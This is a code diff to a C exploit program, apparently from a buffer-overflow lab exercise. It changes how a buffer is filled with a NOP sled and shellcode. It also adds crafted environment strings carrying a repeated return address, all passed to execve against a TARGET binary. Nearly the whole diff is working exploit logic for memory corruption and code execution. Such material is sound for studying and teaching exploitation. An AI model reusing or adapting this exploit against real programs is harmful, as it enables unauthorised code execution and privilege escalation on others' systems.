@@ -12,15 +12,19 @@
 int main(void)
 {
   char *args[3];
-  char *env[8];
+  char *env[9];
   char exploit[256];
   int i;
   int *p;
 
-  strcat(exploit, shellcode);
+  // strcat(exploit, shellcode);
   
-  for(i=45; i<190;i++){
+  for(i=0; i<190;i++){
     exploit[i]= '\x90';
+  }
+
+  for(i=0;i<45;i++){
+    exploit[i+15]=shellcode[i];
   }
   
   // p = (int *) &exploit[168];
@@ -50,13 +54,14 @@ int main(void)
   // env[0] = NULL;
 
   env[0] = "\x00";
-  env[1] = "\xbb";
-  env[2] = "\x00";
+  env[1] = "\x00";
+  env[2] = "\xbb\x00";
   env[3] = "\x00";
   env[4] = "\x00";
-  // env[6] = "\x00";
-  // env[7] = "\x00";
-  env[5] = "xf0\xfd\x21\x30";
+  env[5] = "\xf0\xfd\x21\x30\xf0\xfd\x21\x30\xf0\xfd\x21\x30\x00";
+  env[6] = "\x00";
+  env[7] = "\x00";
+  env[8] = "\x00";
   
 
   if (0 > execve(TARGET, args, env))
